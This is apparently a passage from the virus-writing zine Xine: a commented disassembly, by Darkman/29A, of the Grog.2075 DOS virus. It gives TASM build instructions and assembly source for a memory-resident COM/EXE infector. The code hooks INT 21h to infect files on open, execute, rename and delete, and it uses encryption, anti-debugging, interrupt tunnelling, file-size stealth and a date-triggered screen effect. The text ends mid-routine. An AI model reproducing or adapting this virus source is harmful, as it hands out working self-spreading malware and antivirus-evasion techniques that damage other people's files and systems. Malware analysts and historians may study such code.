   ;                                        /-----------------------------\
   ;                                        | Xine - issue #3 - Phile 306 |
   ;                                        \-----------------------------/



   ; comment *
   ;                  Grog.2075
   ;                Disassembly by
   ;                 Darkman/29A
   ;
   ;   Grog.2075 is a 2075 bytes parasitic direct action and resident COM/EXE
   ;   virus. Infects files at open file, delete file, get or set file attributes,
   ;   load and/or execute program and extended open/create by prepending the virus
   ;   to the infected COM file and appending to the infected EXE file. Grog.2075
   ;   has an error handler, 8-bit subtract encryption in file, anti-tunneling,
   ;   anti-debugging techniques, interrupt stealth at interrupt 21h, filesize
   ;   stealth, restro structures and tunneling of interrupt 21h. Grog.2075 is
   ;   using the pointer to address of interrupt 13h (disk) handler- and interrupt
   ;   21h (DOS functions) get address of InDOS flag DOS exploits.
   ;
   ;   To compile Grog.2075 with Turbo Assembler v 4.0 type:
   ;     TASM /m GROG2075.ASM
   ;     TLINK /t /x GROG2075.OBJ
   ; *

   .model tiny
   .code
    org   100h              ; Origin of Grog.2075

   code_begin:
            xor     ax,ax       ; Zero AX
            mov     es,ax       ; ES = segment of interrupt table
            mov     ds,ax       ; DS = segment of interrupt table

            inc     ah          ; Set trap flag
            mov     dx,ax       ;  "   "    "

            mov     cx,(crypt_end-crypt_begin)
            mov     di,(01h*04h)    ; DI = offset of interrupt vector 01h
            mov     si,di       ; SI =   "    "      "       "     "
            lodsw           ; AX = offset of interrupt 01h
            push    ax          ; Save AX at stack
            lodsw           ; AX = segment of interrupt 01h
            push    ax          ; Save AX at stack

            sub     si,02h      ; SI = offset of segment of interr...

            push    ds si       ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     si,crypt_begin  ; SI = offset of crypt_begin

            lea     ax,decryptor    ; AX = offset of decryptor
            stosw           ; Set interrupt offset 01h
            mov     ax,cs       ; AX = segment of decryptor
            stosw           ; Set interrupt segment 01h

            push    dx          ; Save DX at stack
            popf            ; Load flags from stack (DX)
   decrypt_loop:
            lodsb           ; AL = byte of encrypted code

            loop    decrypt_loop

            mov     ax,4c47h        ; Terminate with return code
            int     21h
   decrypt_exit:
            iret            ; Interrupt return!

   decryptor    proc    near        ; Anti-debugging decryptor
            mov     bp,sp       ; BP = stack pointer

            push    ax          ; Save AX at stack

            push    ds si       ; Save registers at stack
            lds     si,[bp+00h]     ; DS:SI = pointer to decryptor loop
            lodsb           ; AL = byte of decryptor loop
            pop     si ds       ; Load registers from stack

            cmp     al,0e2h         ; LOOP imm8 (opcode 0e2h)?
            jne     test_int21      ; Not equal? Jump to test_int21

            pop     ax          ; Load AX from stack

            add     al,00h      ; Decrypt byte
   decrypt_key  equ     byte ptr $-01h  ; Decryption key

            mov     [si-01h],al     ; Store byte of decrypted code

            jmp     decrypt_exit
   test_int21:
            cmp     al,0cdh         ; INT 21h (opcode 0cdh,21h)?
            pop     ax          ; Load AX from stack
            jne     decrypt_exit    ; Not equal? Jump to decrypt_exit
            endp
   crypt_begin:
            pop     ax ax ax        ; Load registers from stack

            pop     di es ax        ; Load registers from stack

            stosw           ; Set interrupt segment 01h
            sub     di,04h      ; DI = offset of offset of interru...
            pop     ax          ; Load AX from stack
            stosw           ; Set interrupt offset 01h
   virus_exit:
            mov     bx,'Gg'             ; Grog.2075 function
            mov     ax,4b47h        ;     "        "
            int     21h

            mov     ax,2e01h        ; Set verify flag (on)
            xor     dl,dl       ; Zero DL
            int     21h

            mov     ah,2fh      ; Get disk transfer area address
            int     21h
            push    es bx       ; Save registers at stack

            call    install

            lea     dx,dta      ; DX = offset of dta
            mov     ah,1ah      ; Set disk transfer area address
            call    int21_simula

            call    test_assign
            jne     infect_comma    ; ASSIGN not installed? Jump to in...

            mov     ax,601h         ; Get drive assignment table
            int     2fh
            mov     al,es:[105h]    ; AL = the drive which C: is mappe...

            push    ax          ; Save AX at stack
            mov     al,03h      ; Mappe drive C: to drive C:
            mov     es:[105h],al    ; Store drive which C: is mapped to
   infect_comma:
            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,c__command_  ; DX = offset of c__command_
            mov     ax,4300h        ; Get file attributes
            int     21h

            call    test_assign
   mov_code_end:
            jne     find_first      ; ASSIGN not installed? Jump to fi...

            pop     ax          ; Load AX from stack
            mov     es:[105h],al    ; Store drive which C: is mapped to
   find_first:
            mov     ah,4eh      ; Find first matching file
            mov     cx,0000000000000111b
            lea     dx,file_specifi     ; DX = offset of file_specifi
   find_next:
            call    int21_simula
            jc      set_dta_addr    ; Error? Jump to set_dta_addr

            lea     dx,filename     ; DX = offset of filename
            mov     ax,4300h        ; Get file attributes
            int     21h

            mov     ah,4fh      ; Find next matching file

            jmp     find_next
   set_dta_addr:
            pop     dx ds       ; Load registers from stack
            mov     ah,1ah      ; Set disk transfer area address
            call    int21_simula

            jmp     virus_exit

   test_assign  proc    near        ; Test if ASSIGN is installed
            mov     ax,600h         ; ASSIGN installation check
            int     2fh
            cmp     al,0ffh         ; ASSIGN installed?

            ret             ; Return!
            endp

   install      proc    near        ; Tunnel, allocate memory, move vi...
            mov     ax,70h      ; AX = segment of address of inter...
            mov     ds,ax       ; DS =    "    "     "    "     "
            les     bx,ds:[0b4h]    ; ES:BX = pointer to address of in...

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            mov     word ptr [int13_addr],bx
            mov     word ptr [int13_addr+02h],es

            mov     ah,34h      ; Get address of InDOS flag
            int     21h
            mov     ax,es       ; AX = segment of DOS data segment

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            lea     di,dos_data_seg     ; DI = offset of dos_data_seg
            stosw           ; Store segment of DOS data segment

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            mov     si,(21h*04h)    ; SI = offset of interrupt vector 21h
            lea     di,int21_origin     ; DI = offset of int21_origin
            push    si          ; Save SI at stack
            movsw           ; Get interrupt vector 21h
            movsw           ;  "      "       "     "

            lea     di,int21_addr   ; DI = offset of int21_addr
            pop     si          ; Load SI from stack
            movsw           ; Get interrupt vector 21h
            movsw           ;  "      "       "     "

            lds     si,ds:[01h*04h]     ; DS:SI = pointer to interrupt 01h
            lea     di,int01_addr   ; DI = offset of int01_addr
            mov     ax,si       ; AX = offset of interrupt 01h
            stosw           ; Get interrupt offset 01h
            mov     ax,ds       ; AX = segment of interrupt 01h
            stosw           ; Get interrupt segment 01h

            xor     ax,ax       ; Zero AX
            mov     es,ax       ; ES = segment of interrupt table
            mov     di,(01h*04h)    ; DI = offset of interrupt vector 01h
            lea     ax,tunneler     ; AX = offset of tunneler
            stosw           ; Set interrupt offset 01h
            mov     ax,cs       ; AX = code segment
            stosw           ; Set interrupt segment 01h

            pushf           ; Save flags at stack
            pop     ax          ; Load AX from stack (flags)
            or      ah,00000001b    ; Set trap flag
            push    ax          ; Save AX at stack
            popf            ; Load flags from stack (AX)

            mov     ax,4343h        ; Unknown function
            cli             ; Clear interrupt-enable flag
            pushf           ; Save flags at stack
            call    cs:[int21_origin]

            pushf           ; Save flags at stack
            pop     ax          ; Load AX from stack (flags)
            and     ah,11111110b    ; Clear trap flag
            push    ax          ; Save AX at stack
            popf            ; Load flags from stack (AX)

            mov     ah,62h      ; Get current PSP address
            int     21h
            mov     ds,bx       ; DS = segment of PSP for current ...

            cli             ; Clear interrupt-enable flag
            mov     ax,ds:[02h]     ; AX = segment of first byte beyon...
            mov     cx,((code_end-code_begin+0fh)/10h)*04h-02h
            sub     ax,cx       ; Subtract number of paragraphs to...
            mov     ds:[02h],ax     ; Store new segment of first byte ...

            push    ax          ; Save AX at stack
            mov     cx,ds       ; CX = segment of PSP for current ...
            sub     ax,cx       ; Subtract segment of PSP for curr...
            dec     cx          ; CX = segment of last MCB in chain
            mov     ds,cx       ; DS =    "    "   "    "  "    "
            mov     ds:[03h],ax     ; Store new size of memory block i...
            pop     es          ; Load ES from stack (AX)

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            xor     si,si       ; Zero SI
            xor     di,di       ; Zero DI
            mov     cx,(code_end-code_begin+100h)
            rep     movsb       ; Move virus to top of memory

            push    es          ; Save ES at stack
            mov     es,cx       ; ES = segment of interrupt table
            mov     di,(21h*04h)    ; DI = offset of interrupt vector 21h
            lea     ax,int21_virus  ; AX = offset of int21_virus
            stosw           ; Set interrupt offset 21h
            pop     ax          ; Load AX from stack
            stosw           ; Set interrupt segment 21h

            sti             ; Set interrupt-enable flag

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            ret             ; Return!
            endp

   tunneler     proc    near        ; Interrupt 21h tunneler
            push    ax bx       ; Save registers at stack

            mov     bx,cs       ; BX = code segment
            call    test_segment
            cmp     bh,00h      ; Not equal to data- and extra se...?
            je      tst_zero_seg    ; Equal? Jump to tst_zero_seg

            jmp     code_seg_tst
   tst_zero_seg:
            xor     bx,bx       ; BX = segment of interrupt table
            call    test_segment
            cmp     bh,00h      ; Not equal to data- and extra se...?
            je      test_cs_seg     ; Equal? Jump to test_cs_seg

            jmp     zero_seg_tst
   test_cs_seg:
            pop     bx ax       ; Load registers from stack

            push    bp          ; Save BP at stack
   test_cs_seg_:
            mov     bp,sp       ; BP = stack pointer

            push    ax          ; Save AX at stack
            mov     ax,cs       ; AX = code segment
            cmp     [bp+04h],ax     ; Code segment equal to segment of...
            pop     ax          ; Load AX from stack
            je      tunnel_exit_    ; Equal? Jump to tunnel_exit_

            cmp     [bp+04h],0f000h     ; DOS data segment?
   dos_data_seg equ     word ptr $-02h  ; DOS data segment
            jne     test_opcode     ; Not equal? Jump to test_opcode

            push    ax es       ; Save registers at stack

            les     ax,[bp+02h]     ; ES:AX = pointer to interrupt 21h
            mov     word ptr cs:[int21_addr],ax
            mov     word ptr cs:[int21_addr+02h],es

            pop     es ax       ; Load registers from stack

            and     [bp+06h],1111111011111111b

            jmp     tunnel_exit_
   test_opcode:
            push    ds si ax        ; Load registers from stack

            lds     si,[bp+02h]     ; DS:SI = pointer to interrupt 21h
            lodsb           ; AL = opcode of interrupt 21h
            cmp     al,9dh      ; POPF (opcode 9dh)?
            jne     test_pushf      ; Not equal? Jump to test_pushf

            or      [bp+08h],0000000100000000b

            jmp     tunnel_exit
   test_pushf:
            cmp     al,9ch      ; PUSHF (opcode 9ch)?
            jne     test_iret       ; Not equal? Jump to test_iret

            jmp     pushf_simula
   test_iret:
            cmp     al,0cfh         ; IRET (opcode 0cfh)?
            jne     test_dec_sp     ; Not equal? Jump to test_dec_sp

            or      [bp+0ch],0000000100000000b
   tunnel_exit:
            pop     ax si ds        ; Load registers from stack
   tunnel_exit_:
            pop     bp          ; Load BP from stack

            iret            ; Interrupt return!
   test_dec_sp:
            cmp     al,4ch      ; DEC SP (opcode 4ch)?
            jne     tunnel_exit     ; Not equal? Jump to tunnel_exit

            mov     ax,[bp+02h]     ; AX = instruction pointer of inte...
            inc     ax          ; Increase AX
            mov     [bp+02h],ax     ; Store instruction pointer of int...

            push    di          ; Save DI at stack

            push    ss          ; Save SS at stack
            pop     ds          ; Load DS from stack (SS)

            mov     si,sp       ; SI = stack pointer
            mov     di,bp       ; DI = stack pointer
            add     di,08h      ; DI = offset of end of stack
   move_stack:
            lodsw           ; AL = word of stack
            mov     [si-03h],ax     ; Store word of stack

            cmp     si,di       ; End of stack?
            jne     move_stack      ; Not equal? Jump to move_stack

            mov     al,01000011b    ; AL = low-order 8-bits of flags
            mov     [bp+07h],al     ; Store low-order 8-bits of flags

            dec     sp          ; Decrease SP

            pop     di          ; Load DI from stack

            pop     ax si ds        ; Load registers from stack

            jmp     test_cs_seg_
   code_seg_tst:
            pop     bx ax       ; Load registers from stack

            push    bp ds       ; Save registers at stack

            lea     bp,int24_exit   ; BP = offset of int24_exit
            mov     ds,bp       ; DS =   "    "      "
            lea     bp,tunneler     ; BP = offset of tunneler
            call    exam_mod_reg

            pop     ds          ; Load DS from stack

            jmp     test_cs_seg_
   zero_seg_tst:
            pop     bx ax       ; Load registers from stack

            push    bp          ; Save BP at stack

            push    ds          ; Save DS at stack

            lea     bp,int01_addr   ; BP = offset of int01_addr
            mov     ds,bp       ; DS =   "    "      "
            mov     bp,(01h*04h)    ; BP = offset of interrupt vector 01h
            call    exam_mod_reg

            pop     ds          ; Load DS from stack

            cmp     bp,05h      ; Found offset of interrupt table?
            je      tst_data_seg    ; Equal? Jump to tst_data_seg

            jmp     test_cs_seg_
   tst_data_seg:
            push    ax          ; Save AX at stack

            push    cs          ; Save CS at stack

            mov     ax,ds       ; AX = data segment
            cmp     ax,00h      ; Segment of interrupt vector table?
            je      mov_cs_to_ds    ; Equal? Jump to mov_cs_to_ds

            pop     es          ; Load ES from stack (CS)

            jmp     jump_test_cs
   mov_cs_to_ds:
            pop     ds          ; Load DS from stack (CS)
   jump_test_cs:
            pop     ax          ; Load AX from stack

            jmp     test_cs_seg_
   pushf_simula:
            mov     ax,[bp+02h]     ; AX = instruction pointer of inte...
            inc     ax          ; Increase AX
            mov     [bp+02h],ax     ; Store instruction pointer of int...

            push    di ds       ; Save registers at stack

            push    ss          ; Save SS at stack
            pop     ds          ; Load DS from stack (SS)

            mov     si,sp       ; SI = stack pointer
            mov     di,bp       ; DI = stack pointer
            add     di,08h      ; DI = offset of end of stack
   move_stack_:
            lodsw           ; AL = word of stack
            mov     [si-04h],ax     ; Store word of stack

            cmp     si,di       ; End of stack?
            jne     move_stack_     ; Not equal? Jump to move_stack_

            sub     sp,02h      ; Subtract two from SP

            pop     ds di       ; Load registers from stack

            push    [bp+04h]        ; Save flags at stack
            pop     [bp+06h]        ; Load flags from stack

            and     [bp+06h],1111111011111111b

            pop     ax si ds        ; Load registers from stack

            jmp     test_cs_seg_

   test_segment proc    near        ; Test data- and extra segment
            mov     ax,ds       ; AX = data segment
            cmp     ax,bx       ; Equal to data segment
            jne     test_es_seg     ; Not equal? Jump to test_es_seg

            ret             ; Return!
   test_es_seg:
            mov     ax,es       ; AX = extra segment
            cmp     ax,bx       ; Equal to extra segment?
            jne     not_equal       ; Not equal? Jump to not_equal

            ret             ; Return!
   not_equal:
            xor     bh,bh       ; Segment not found

            ret             ; Return!
            endp

   exam_mod_reg proc    near        ; Examine and prehaps modify register
            cmp     ax,bp       ; Equal to test register value?
            jne     exam_bx_reg     ; Not equal? Jump to exam_bx_reg

            mov     ax,ds       ; AX = new register value

            jmp     found_reg
   exam_bx_reg:
            cmp     bx,bp       ; Equal to test register value?
            jne     exam_cx_reg     ; Not equal? Jump to exam_cx_reg

            mov     bx,ds       ; BX = new register value

            jmp     found_reg
   exam_cx_reg:
            cmp     cx,bp       ; Equal to test register value?
            jne     exam_dx_reg     ; Not equal? Jump to exam_dx_reg

            mov     cx,ds       ; CX = new register value

            jmp     found_reg
   exam_dx_reg:
            cmp     dx,bp       ; Equal to test register value?
            jne     exam_si_reg     ; Not equal? Jump to exam_si_reg

            mov     dx,ds       ; DX = new register value

            jmp     found_reg
   exam_si_reg:
            cmp     si,bp       ; Equal to test register value?
            jne     exam_di_reg     ; Not equal? Jump to exam_di_reg

            mov     si,ds       ; SI = new register value

            jmp     found_reg
   exam_di_reg:
            cmp     di,bp       ; Equal to test register value?
            jne     exam_reg_end    ; Not equal? Jump to exam_reg_end

            mov     di,ds       ; DI = new register value
   found_reg:
            inc     bp          ; BP = found test register value
   exam_reg_end:
            ret             ; Return!
            endp
            endp

   xchg_int13   proc    near        ; Exchange address of interrupt 13h
            push    cs cs       ; Save segments at stack
            pop     ds es       ; Load segments from stack (CS)

            lea     si,int13_addr   ; SI = offset of int13_addr
            lodsw           ; Load offset of interrupt 13h
            push    ax          ; Save AX at stack
            lodsw           ; Load segment of interrupt 13h
            push    ax          ; Save AX at stack

            xor     ax,ax       ; Zero AX
            mov     ds,ax       ; DS = segment of interrupt table
            mov     si,(13h*04h)    ; SI = offset of interrupt vector 13h
            lea     di,int13_addr   ; DI = offset of int13_addr
            movsw           ; Get interrupt vector 13h
            movsw           ;  "      "       "     "

            xor     ax,ax       ; Zero AX
            mov     es,ax       ; ES = segment of interrupt table
            mov     di,(13h*04h+02h)    ; DI = offset of interrupt segment...

            std             ; Set direction flag
            pop     ax          ; Load AX from stack
            stosw           ; Set interrupt segment 13h
            pop     ax          ; Load AX from stack
            stosw           ; Set interrupt offset 13h

            cld             ; Clear direction flag

            push    cs cs       ; Save segments at stack
            pop     ds es       ; Load segments from stack (CS)

            ret             ; Return!
            endp
   not_infectab:
            xor     bl,bl       ; File not infectable
   infectable:
            pop     cx di es        ; Load registers from stack

            ret             ; Return!

   examine_file proc    near        ; Examine COM/EXE file
            push    es di cx        ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)
   find_zero:
            lodsb           ; AL = byte of filename
            cmp     al,00h      ; End of filename?
            jne     find_zero       ; Not equal? Jump to find_zero

            sub     si,05h      ; SI = offset of extension
            lodsb           ; AL = byte of filename
            cmp     al,'.'              ; Found dot before the extension?
            jne     not_infectab    ; Not equal? Jump to not_infectab

            mov     cs:[com_or_exe],00h ; COM executable

            lea     di,com_executab     ; DI = offset of com_executab
            call    examine_name
            je      prepare_loop    ; COM executable? Jump to prepare_...

            mov     cs:[com_or_exe],01h ; EXE executable

            lea     di,exe_executab     ; DI = offset of exe_executab
            call    examine_name
            jne     not_infectab    ; EXE executable? Jump to not_infe...
   prepare_loop:
            sub     si,05h      ; SI = offset of middle of filename
            lea     di,table_begin  ; DI = offset of table_begin
            mov     cx,(table_end-table_begin)/04h
   table_loop:
            call    examine_name
            je      not_infectab    ; Equal? Jump to not_infectab

            add     di,04h      ; DI = offset of the next four byt...

            loop    table_loop

            mov     bl,01h      ; File infectable

            jmp     infectable
            endp

   examine_name proc    near        ; Examine filename
            push    si di cx        ; Save registers at stack

            mov     cx,04h      ; Examine four bytes
   examine_loop:
            lodsb           ; AL = byte of filename
            and     al,01011111b    ; Upcase character
            scasb           ; Match found in examined filename?
            jne     not_matching    ; Not equal? Jump to not_matching

            loop    examine_loop
   not_matching:
            cmp     cl,00h      ; Match found in examined filename

            pop     cx di si        ; Load registers from stack

            ret             ; Return!
            endp

   int24_virus  proc    near        ; Interrupt 24h of Grog.2075
            pop     ax ax ax        ; Load registers from stack

            pop     es ds bp di si dx cx bx ax

            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            or      word ptr [bp+06h],0000000000000001b
            pop     bp          ; Load BP from stack
   int24_exit:
            iret            ; Interrupt return!
            endp

            nop
   dta_stealth:
            call    del_chklist
   dta_stealth_:
            popf            ; Load flags from stack

            call    int21_simula

            push    ds es ax bx cx si   ; Save registers at stack

            pushf           ; Save flags at stack
            pop     ax          ; Load AX from stack (flags)

            cld             ; Clear direction flag

            push    bp          ; Save BP at stack
            mov     bp,sp       ; BP = stack pointer
            mov     [bp+12h],ax     ; Store flags
            pop     bp          ; Load BP from stack

            jc      dta_dont_ste    ; Error? Jump to dta_dont_ste

            mov     ah,2fh      ; Get disk transfer area address
            call    int21_simula

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,bx       ; SI = offset of disk transfer area
            add     si,16h      ; SI = offset of file time
            lodsw           ; AX = file time

            and     al,00011111b    ; AL = seconds of file time
            cmp     al,00010001b    ; Infected (34 seconds)?
            jne     dta_dont_ste    ; Not infected? Jump to dta_dont_ste

            sub     [si+02h],(code_end-code_begin)
   dta_dont_ste:
            pop     si cx bx ax es ds   ; Load registers from stack

            iret            ; Interrupt return!
   fcb_stealth:
            call    del_chklist
   fcb_stealth_:
            popf            ; Load flags from stack

            call    int21_simula
            cmp     al,00h      ; Match no found?
            jne     fcb_ste_exit    ; Not equal? Jump to fcb_ste_exit

            push    es ax bx        ; Save registers at stack

            mov     ah,51h      ; Get current PSP address
            call    int21_simula
            mov     es,bx       ; ES = segment of PSP for current ...
            cmp     bx,es:[16h]     ; Parent PSP equal to current PSP?
            jne     fcb_dont_ste    ; Not equal? Jump to fcb_dont_ste

            mov     bx,dx       ; BX = offset of unopened FCB
            mov     al,[bx]         ; AL = extended FCB

            push    ax          ; Save AX at stack
            mov     ah,2fh      ; Get disk transfer area address
            call    int21_simula
            pop     ax          ; Load AX from stack

            inc     al          ; Extended FCB?
            jne     not_extended    ; Not equal? Jump to not_extended

            add     bx,07h      ; BX = offset of normal FCB
   not_extended:
            mov     ax,es:[bx+17h]  ; AX = file time
            and     ax,0000000000011111b
            cmp     ax,0000000000010001b
            jne     fcb_dont_ste    ; Not infected? Jump to fcb_dont_ste

            sub     es:[bx+1dh],(code_end-code_begin)
   fcb_dont_ste:
            pop     bx ax es        ; Load registers from stack
   fcb_ste_exit:
            iret            ; Interrupt return!
   set_int21_st:
            mov     word ptr cs:[int21_origin],dx
            mov     word ptr cs:[int21_origin+02h],ds

            popf            ; Load flags from stack

            iret            ; Interrupt return!
   get_int21_st:
            mov     bx,word ptr cs:[int21_origin]
            mov     es,word ptr cs:[int21_origin+02h]

            popf            ; Load flags from stack

            iret            ; Interrupt return!
   jmp_dta_ste:
            jmp     dta_stealth_
   jmp_dta_ste_:
            jmp     dta_stealth
   jmp_fcb_ste:
            jmp     fcb_stealth_
   jmp_fcb_ste_:
            jmp     fcb_stealth

   int21_virus  proc    near        ; Interrupt 21h of Grog.2075
            pushf           ; Save flags at stack

            push    ax          ; Save AX at stack
            mov     ax,'Gg'
            push    ax          ; Save AX at stack
            pop     ax          ; Load AX from stack

            dec     sp          ; Decrease SP
            dec     sp          ; Decrease SP

            pop     ax          ; Load AX from stack
            cmp     ax,'Gg'             ; Tunneling?
            pop     ax          ; Load AX from stack
            je      test_functio    ; No tunneling? Jump to test_functio

            popf            ; Load flags from stack

            iret            ; Interrupt return!
   test_functio:
            cmp     ah,4eh      ; Find first matching file (DTA)?
            je      jmp_dta_ste_    ; Equal? Jump to jmp_dta_ste_
            cmp     ah,4fh      ; Find next matching file (DTA)?
            je      jmp_dta_ste     ; Equal? Jump to jmp_dta_ste
            cmp     ah, 11h         ; Find first matching file (DTA)?
            je      jmp_fcb_ste_    ; Equal? Jump to jmp_fcb_ste_
            cmp     ah, 12h         ; Find next matching file (DTA)?
            je      jmp_fcb_ste     ; Equal? Jump to jmp_fcb_ste

            cmp     ax,2521h        ; Set interrupt vector 21h?
            je      set_int21_st    ; Equal? Jump to set_int21_st
            cmp     ax,3521h        ; Get interrupt vector 21h?
            je      get_int21_st    ; Equal? Jump to get_int21_st

            cmp     ax,4b47h        ; Grog.2075 function?
            je      jmp_grog_fun    ; Equal? Jump to jmp_grog_fun

            cmp     ax,6c00h        ; Extended open/create?
            je      tst_ext_open    ; Equal? Jump to tst_ext_open
            cmp     ah,3dh      ; Open file?
            je      tst_ext_open    ; Equal? Jump to tst_ext_open
            cmp     ah,56h      ; Rename file?
            je      tst_ext_open    ; Equal? Jump to tst_ext_open
            cmp     ah,43h      ; Get or set file attributes?
            je      tst_ext_open    ; Equal? Jump to tst_ext_open
            cmp     ah,41h      ; Delete file?
            je      tst_ext_open    ; Equal? Jump to tst_ext_open
            cmp     ah,4bh      ; Load and/or execute program?
            je      tst_ext_open    ; Equal? Jump to tst_ext_open

            jmp     int21_exit_
   tst_ext_open:
            push    ax bx cx dx si di bp ds es

            cld             ; Clear direction flag

            cmp     ah,6ch      ; Extended open/create?
            jne     not_ext_open    ; Not equal? Jump to not_ext_open

            mov     dx,si       ; DX = offset of filename
   not_ext_open:
            xor     al,al       ; Zero AL
            mov     bp,ax       ; BP = DOS function
            mov     si,es       ; SI = extra segment

            mov     ax,3524h        ; Get interrupt vector 24h
            call    int21_simula
            push    bx es       ; Save registers at stack

            push    ds dx       ; Save registers at stack

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            lea     dx,int24_virus  ; DX = offset of int24_virus
            mov     ax,2524h        ; Set interrupt vector 24h
            call    int21_simula

            pop     dx ds       ; Load registers from stack

            jmp     prepare_exam
   jmp_grog_fun:
            jmp     grog_functio
   video_effect:
            pop     ds dx       ; Load registers from stack
            mov     ax,2524h        ; Set interrupt vector 24h
            call    int21_simula

            mov     ah,2ah      ; Get system date
            call    int21_simula
            cmp     dl,11h      ; Produce video effect?
            jne     int21_exit      ; Not equal? Jump to int21_exit

            mov     ax,40h      ; AX = segment of BIOS data segment
            mov     ds,ax       ; DS =    "    "   "    "      "
            mov     al,ds:[17h]     ; AL = keyboard status flag one
            and     al,01110000b    ; Clear insert active, either alt ...
            cmp     al,01110000b    ; Caps lock, num lock and scroll l...
            jne     int21_exit      ; Not equal? Jump to int21_exit

            mov     ax,0b800h       ; AX = segment of text video RAM
            mov     es,ax       ; ES =    "    "   "     "    "

            push    cs          ; Save CS at stack
            pop     ds          ; Load DS from stack (CS)

            xor     di,di       ; Zero DI
            lea     si,stdout_str+01h   ; SI = offset of stdout_str + 01h
            lea     bp,stdout_end   ; BP = offset of stdout_end
   sto_str_int3:
            movsb           ; Move byte of stdout_str to text ...

            mov     al,0cch         ; INT 03h (opcode 0cch)
            stosb           ; Store INT 03h

            cmp     si,bp       ; End of stdout_str?
            jne     sto_str_int3    ; Not equal? Jump to sto_str_int3

            push    cs          ; Save CS at stack
            pop     bx          ; Load BX from stack (CS)
            sub     bx,1ffeh        ; Subtract eight thousand nine-hun...

            mov     ah,2ch      ; Get system time
            call    int21_simula
            cmp     dx,bx       ; Seconds below top of memory?
            jb      store_nop       ; Below? Jump to store_nop

            xor     dh,dh       ; Zero DH
   store_nop:
            push    dx          ; Save DX at stack
            pop     es          ; Load ES from stack (DX)

            mov     di,cx       ; DI = hour and minute
            mov     al,90h      ; NOP (opcode 90h)
            stosb           ; Store NOP
   int21_exit:
            pop     es ds bp di si dx cx bx ax
   int21_exit_:
            popf            ; Load flags from stack

            db      0eah        ; JMP imm32 (opcode 0eah)
   int21_origin dd      ?           ; Address of interrupt 21h
            endp
   grog_functio:
            cmp     bx,'Gg'             ; Grog.2075 function?
            jne     int21_exit_     ; Not equal? Jump to int21_exit_

            pop     ax ax ds        ; Load registers from stack

            push    ds          ; Save DS at stack
            pop     es          ; Load ES from stack (DS)

            cmp     [com_or_exe],01h    ; EXE executable?
            je      vir_exe_exit    ; Equal? Jump to vir_exe_exit

            mov     si,[origin_off]     ; SI = offset of original code of ...
            mov     ax,100h         ; AX = offset of beginning of code
            add     si,ax       ; SI = offset of original code
            mov     di,ax       ; DI = offset of beginning of code
            mov     cx,(code_end-code_begin)

            push    ds ax       ; Save registers at stack
   restore_loop:
            movsb           ; Move the original code

            loop    restore_loop
   zero_regs:
            xor     ax,ax       ; Zero AX
            mov     bx,ax       ; Zero BX
            mov     cx,ax       ; Zero CX
            mov     dx,ax       ; Zero DX
            mov     bp,ax       ; Zero BP
            mov     si,ax       ; Zero SI
            mov     di,ax       ; Zero DI

            iret            ; Interrupt return!
   vir_exe_exit:
            mov     ah,62h      ; Get current PSP address
            call    int21_simula

            add     bx,10h      ; BX = segment of beginning of code
            add     word ptr [file_header+16h],bx
            add     word ptr [file_header+0eh],bx

            pop     ax          ; Load AX from stack

            cli             ; Clear interrupt-enable flag
            mov     ss,word ptr [file_header+0eh]
            mov     sp,word ptr [file_header+10h]
            sti             ; Set interrupt-enable flag

            push    ax          ; Save AX at stack
            push    word ptr [file_header+16h]
            push    word ptr [file_header+14h]

            sub     bx,10h      ; BX = segment of PSP for current ...
            mov     ds,bx       ; DS =    "    "   "   "     "     "
            mov     es,bx       ; ES =    "    "   "   "     "     "

            jmp     zero_regs
   prepare_exam:
            mov     es,si       ; ES = extra segment
            mov     si,dx       ; SI = offset of filename
            call    examine_file
            cmp     bl,00h      ; File not infectable?
            jne     test_rename     ; Not equal? Jump to test_rename

            jmp     video_effect
   test_rename:
            cmp     bp,5600h        ; Rename file?
            jne     open_file       ; Not equal? Jump to open_file

            push    ds          ; Save DS at stack

            push    es          ; Save ES at stack
            pop     ds          ; Load DS from stack (ES)

            mov     si,di       ; SI = offset of filename
            call    examine_file
            pop     ds          ; Load DS from stack
            cmp     bl,00h      ; File not infectable?
            jne     open_file       ; Not equal? Jump to open_file

            jmp     video_effect
   open_file:
            push    ds dx       ; Save registers at stack

            mov     cs:[set_file_att],00h

            call    xchg_int13

            pop     dx ds       ; Load registers from stack

            call    open_file_

            call    xchg_int13

            jmp     video_effect

   open_file_   proc    near        ; Get file attributes, open file, ...
            mov     ax,4300h        ; Get file attributes
            call    int21_simula
            push    cx          ; Save CX at stack
            jc      open_error      ; Error? Jump to open_error

            mov     ax,3d00h        ; Open file (read)
            call    int21_simula
            xchg    ax,bx       ; BX = file handle
            jc      open_error      ; Error? Jump to open_error

            push    dx          ; Save DX at stack
            mov     ax,5700h        ; Get file's date and time
            call    int21_simula
            and     cl,00011111b    ; CL = seconds of file time?
            cmp     cl,00010001b    ; Already infected? (34 seconds)?
            pop     dx          ; Load DS from stack
            je      already_inf     ; Equal? Jump to already_inf

            push    ds dx       ; Save registers at stack
            call    tst_filesize

            mov     ah,3eh      ; Close file
            call    int21_simula
            pop     dx ds       ; Load registers from stack

            pop     cx          ; Load CX from stack

            cmp     cs:[set_file_att],00h
            je      dont_set_att    ; Don't set file attributes? Jump ...

            mov     ax,4301h        ; Set file attributes
            call    int21_simula
   dont_set_att:
            ret             ; Return!
   open_error:
            pop     cx          ; Load CX from stack

            ret             ; Return!
   already_inf:
            pop     cx          ; Load CX from stack

            mov     ah,3eh      ; Close file
            call    int21_simula

            ret             ; Return!
            endp

            db      '>>4/93<<'

   tst_filesize proc    near        ; Test filesize
            push    dx          ; Save DX at stack

            push    cs          ; Save CS at stack
            pop     es          ; Load ES from stack (CS)

            mov     al,02h      ; Set current file position (EOF)
            xor     dx,dx       ; Zero DX
            call    set_file_pos

            mov     cs:[origin_off],ax  ; Store offset of original code of...

